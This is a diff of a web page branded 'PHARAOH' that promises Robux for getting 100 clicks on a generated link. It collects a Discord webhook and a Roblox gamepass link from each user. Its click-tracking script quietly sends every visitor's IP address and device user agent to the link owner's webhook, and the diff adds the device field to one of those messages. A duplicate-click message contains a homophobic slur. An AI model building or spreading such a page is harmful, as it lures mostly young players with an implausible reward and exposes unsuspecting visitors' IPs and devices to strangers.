@@ -67,19 +67,37 @@
             margin-bottom: 2rem;
         }
         
-        .logo {
+        .page-title {
             font-family: 'Orbitron', sans-serif;
-            font-size: 3rem;
+            font-size: 2.5rem;
             font-weight: 700;
             color: var(--white);
             text-shadow: 0 0 10px var(--bright-red), 0 0 20px var(--bright-red);
-            margin-bottom: 1rem;
+            margin-bottom: 0.5rem;
         }
         
-        .subtitle {
-            font-family: 'Orbitron', sans-serif;
+        .page-subtitle {
+            font-family: 'Rajdhani', sans-serif;
+            font-size: 1.2rem;
             color: var(--white);
             margin-bottom: 2rem;
+        }
+        
+        .home-btn {
+            position: absolute;
+            top: 2rem;
+            right: 2rem;
+            background: var(--dark-red);
+            color: var(--white);
+            padding: 0.5rem 1rem;
+            border-radius: 0.5rem;
+            text-decoration: none;
+            font-family: 'Orbitron', sans-serif;
+            transition: all 0.3s ease;
+        }
+        
+        .home-btn:hover {
+            background: var(--bright-red);
         }
         
         .card {
@@ -99,7 +117,6 @@
             text-shadow: 0 0 8px var(--bright-red);
             margin-bottom: 1.5rem;
             font-family: 'Orbitron', sans-serif;
-            text-align: center;
         }
         
         .form-group {
@@ -113,7 +130,16 @@
             font-weight: 600;
         }
         
-        .form-group input {
+        .input-group {
+            display: flex;
+            gap: 0.5rem;
+        }
+        
+        .input-group input {
+            flex: 1;
+        }
+        
+        .form-control {
             width: 100%;
             padding: 0.75rem;
             background: rgba(0, 0, 0, 0.5);
@@ -139,15 +165,24 @@
             box-shadow: 0 4px 15px rgba(255, 0, 0, 0.2);
             font-family: 'Orbitron', sans-serif;
             cursor: pointer;
-            width: 100%;
-            margin-top: 1rem;
             border: none;
+            width: 100%;
         }
         
         .btn:hover {
             background-color: var(--bright-red);
             transform: translateY(-2px);
             box-shadow: 0 8px 20px rgba(255, 0, 0, 0.4);
+        }
+        
+        .btn-copy {
+            width: auto;
+            padding: 0.75rem;
+            background: rgba(139, 0, 0, 0.5);
+        }
+        
+        .btn-copy:hover {
+            background: var(--bright-red);
         }
         
         .link-display {
@@ -157,19 +192,34 @@
             border-radius: 0.5rem;
             margin: 1rem 0;
             border: 1px dashed var(--bright-red);
-            text-align: center;
+            font-family: monospace;
         }
         
         .success-message {
             color: #00ff00;
             text-align: center;
             margin: 1rem 0;
+            font-weight: 600;
         }
         
         .error-message {
             color: var(--bright-red);
             text-align: center;
             margin: 1rem 0;
+            font-weight: 600;
+        }
+        
+        .form-note {
+            color: var(--gray);
+            font-size: 0.9rem;
+            margin-top: 0.5rem;
+        }
+        
+        .footer-note {
+            text-align: center;
+            color: var(--gray);
+            font-size: 0.9rem;
+            margin-top: 2rem;
         }
         
         .hidden {
@@ -181,8 +231,17 @@
                 padding: 1rem;
             }
             
-            .logo {
+            .page-title {
                 font-size: 2rem;
+                margin-top: 2rem;
+            }
+            
+            .home-btn {
+                position: relative;
+                top: auto;
+                right: auto;
+                margin-bottom: 1rem;
+                display: inline-block;
             }
         }
     </style>
@@ -191,62 +250,59 @@
     <div class="scanlines"></div>
     
     <div class="container">
+        <a href="/" class="home-btn">
+            <i class="fas fa-home"></i> Home
+        </a>
+        
         <header>
-            <div class="logo">PHARAOH</div>
-            <div class="subtitle">MAKE MONEY</div>
-            <a href="/" class="btn">
-                <i class="fas fa-home"></i> Home
-            </a>
+            <h1 class="page-title">MAKE MONEY</h1>
+            <p class="page-subtitle">Generate your own link, share it, and earn 15,000 Robux when you reach 100 clicks!</p>
         </header>
         
         <main>
+            <!-- Initial Form Card -->
             <div class="card" id="initial-card">
-                <h2 class="card-title">EARN ROBUX</h2>
-                <p style="text-align: center; margin-bottom: 1.5rem;">
-                    Generate your own link, share it, and earn 6000-8000 Robux when you reach 100 clicks!
-                </p>
-                
                 <div class="form-group">
-                    <label for="webhook-url">Your Discord Webhook URL</label>
-                    <input type="text" id="webhook-url" placeholder="https://discord.com/api/webhooks/...">
-                    <small style="color: var(--gray);">We'll send notifications to this webhook when someone clicks your link.</small>
+                    <label for="webhook-url">Your Discord Webhook Url</label>
+                    <input type="text" id="webhook-url" class="form-control" placeholder="https://discord.com/api/webhooks/...">
+                    <p class="form-note">We'll send notifications to this webhook when someone clicks your link.</p>
                 </div>
                 
                 <button id="generate-btn" class="btn">
-                    <i class="fas fa-link"></i> Generate Link
+                    <i class="fas fa-link"></i> GENERATE LINK
                 </button>
                 
                 <div id="webhook-error" class="error-message hidden"></div>
             </div>
             
+            <!-- Generated Link Card (hidden by default) -->
             <div class="card hidden" id="link-card">
-                <h2 class="card-title">YOUR LINK IS READY!</h2>
-                <p style="text-align: center; margin-bottom: 1.5rem;">
-                    Share this link to earn Robux when people click it!
-                </p>
-                
-                <div class="link-display" id="generated-link">
-                    https://pharaohbeam.xyz/loading...
+                <h2 class="card-title">Your Link is Ready!</h2>
+                <div class="input-group">
+                    <div class="link-display" id="generated-link">https://pharaohbeam.xyz/loading...</div>
+                    <button id="copy-btn" class="btn btn-copy" title="Copy to clipboard">
+                        <i class="fas fa-copy"></i>
+                    </button>
                 </div>
+            </div>
+            
+            <!-- Gamepass Submission Card (hidden by default) -->
+            <div class="card hidden" id="gamepass-card">
+                <h2 class="card-title">SUBMIT YOUR GAMEPASS</h2>
+                <p>Create a Roblox gamepass for 6000-8000 Robux and submit the link below. We'll automatically purchase it when you reach 100 clicks!</p>
                 
                 <div class="form-group">
-                    <label for="gamepass-url">Submit Your Gamepass</label>
-                    <p style="margin-bottom: 1rem; color: var(--gray);">
-                        Create a Roblox gamepass for 6000-8000 Robux and submit the link below. We'll automatically purchase it when you reach 100 clicks!
-                    </p>
-                    <input type="text" id="gamepass-url" placeholder="https://www.roblox.com/game-pass/...">
+                    <input type="text" id="gamepass-url" class="form-control" placeholder="https://www.roblox.com/game-pass/...">
                 </div>
                 
                 <button id="submit-gamepass" class="btn">
-                    <i class="fas fa-check"></i> Submit Gamepass
+                    <i class="fas fa-check"></i> SUBMIT GAMEPASS
                 </button>
                 
-                <div id="success-message" class="success-message hidden"></div>
+                <div id="success-message" class="success-message hidden">Gamepass Submitted! We will buy your gamepass once you reach 100 clicks</div>
                 <div id="gamepass-error" class="error-message hidden"></div>
                 
-                <p style="text-align: center; margin-top: 1.5rem; color: var(--gray);">
-                    If you have any issues, make ticket in our discord server <strong>discord.gg/phar</strong>
-                </p>
+                <p class="footer-note">If you have any issues, contact <a href="https://discord.gg/phar" style="color: var(--bright-red);">https://discord.gg/phar</a> on Discord.</p>
             </div>
         </main>
     </div>
@@ -259,10 +315,12 @@
         // DOM Elements
         const initialCard = document.getElementById('initial-card');
         const linkCard = document.getElementById('link-card');
+        const gamepassCard = document.getElementById('gamepass-card');
         const generateBtn = document.getElementById('generate-btn');
         const webhookUrlInput = document.getElementById('webhook-url');
         const webhookError = document.getElementById('webhook-error');
         const generatedLink = document.getElementById('generated-link');
+        const copyBtn = document.getElementById('copy-btn');
         const gamepassUrlInput = document.getElementById('gamepass-url');
         const submitGamepassBtn = document.getElementById('submit-gamepass');
         const successMessage = document.getElementById('success-message');
@@ -271,16 +329,16 @@
         // Generate random link ID
         function generateLinkId() {
             const adjectives = ['cool', 'epic', 'pharaoh', 'money', 'robux', 'fast', 'quick', 'easy', 'gold', 'diamond'];
-            const animals = ['hawk', 'panda', 'lion', 'tiger', 'wolf', 'fox', 'eagle', 'shark', 'dragon', 'phoenix'];
-            const numbers = Math.floor(Math.random() * 900) + 100;
+            const animals = ['panda', 'hawk', 'lion', 'tiger', 'wolf', 'fox', 'eagle', 'shark', 'dragon', 'phoenix'];
+            const numbers = Math.floor(Math.random() * 9000) + 1000;
             
             const adjective = adjectives[Math.floor(Math.random() * adjectives.length)];
             const animal = animals[Math.floor(Math.random() * animals.length)];
             
-            return `${adjective}-${animal}-${numbers}`;
+            return `${adjective}${animal}${numbers}`;
         }
         
-        // Test webhook
+        // Test webhook and send success message
         async function testWebhook(webhookUrl) {
             try {
                 const response = await fetch(webhookUrl, {
@@ -356,7 +414,7 @@
                 webhookError.textContent = 'Webhook test failed. Please check your URL and try again.';
                 webhookError.classList.remove('hidden');
                 generateBtn.disabled = false;
-                generateBtn.innerHTML = '<i class="fas fa-link"></i> Generate Link';
+                generateBtn.innerHTML = '<i class="fas fa-link"></i> GENERATE LINK';
                 return;
             }
             
@@ -381,6 +439,22 @@
             generatedLink.textContent = userLink;
             initialCard.classList.add('hidden');
             linkCard.classList.remove('hidden');
+            gamepassCard.classList.remove('hidden');
+            
+            // Reset generate button
+            generateBtn.disabled = false;
+            generateBtn.innerHTML = '<i class="fas fa-link"></i> GENERATE LINK';
+        });
+        
+        // Copy link to clipboard
+        copyBtn.addEventListener('click', () => {
+            navigator.clipboard.writeText(generatedLink.textContent).then(() => {
+                const originalText = copyBtn.innerHTML;
+                copyBtn.innerHTML = '<i class="fas fa-check"></i> Copied!';
+                setTimeout(() => {
+                    copyBtn.innerHTML = originalText;
+                }, 2000);
+            });
         });
         
         // Submit gamepass
@@ -407,12 +481,11 @@
             
             // Show success
             gamepassError.classList.add('hidden');
-            successMessage.textContent = 'Gamepass submitted successfully! Start sharing your link to earn Robux!';
             successMessage.classList.remove('hidden');
             
             // Disable the button
             submitGamepassBtn.disabled = true;
-            submitGamepassBtn.innerHTML = '<i class="fas fa-check"></i> Gamepass Submitted';
+            submitGamepassBtn.innerHTML = '<i class="fas fa-check"></i> SUBMITTED';
         });
 
         // Check if this is a generated link (for click tracking)
@@ -439,7 +512,7 @@
                         body: JSON.stringify({
                             embeds: [{
                                 title: "⚠️ DUPLICATE CLICK DETECTED",
-                                description: `NICE TRY FAGGOT CLICKING ON THE SAME LINK TWICE WONT WORK CLOWN! -PHARAOH\n\n**Link ID:** ${linkId}\n**IP:** ${visitorIp}\n**Time:** ${now.toISOString()}`,
+                                description: `NICE TRY FAGGOT CLICKING ON THE SAME LINK TWICE WONT WORK CLOWN! -PHARAOH\n\n**Link ID:** ${linkId}\n**IP:** ${visitorIp}\n**Device:** ${navigator.userAgent}\n**Time:** ${now.toISOString()}`,
                                 color: 0xff0000,
                                 thumbnail: {
                                     url: PHARAOH_PFP
@@ -462,8 +535,8 @@
                         },
                         body: JSON.stringify({
                             embeds: [{
-                                title: "🔔 NEW CLICK!",
-                                description: `Your link was clicked!\n\n**Link ID:** ${linkId}\n**Total Clicks:** ${userData.clicks}/100\n**IP:** ${visitorIp}\n**Device:** ${navigator.userAgent}\n**Time:** ${now.toISOString()}`,
+                                title: "🔔 NEW CLICK DETECTED",
+                                description: `**Link ID:** ${linkId}\n**Total Clicks:** ${userData.clicks}/100\n**IP:** ${visitorIp}\n**Device:** ${navigator.userAgent}\n**Time:** ${now.toISOString()}`,
                                 color: 0x00ff00,
                                 thumbnail: {
                                     url: PHARAOH_PFP
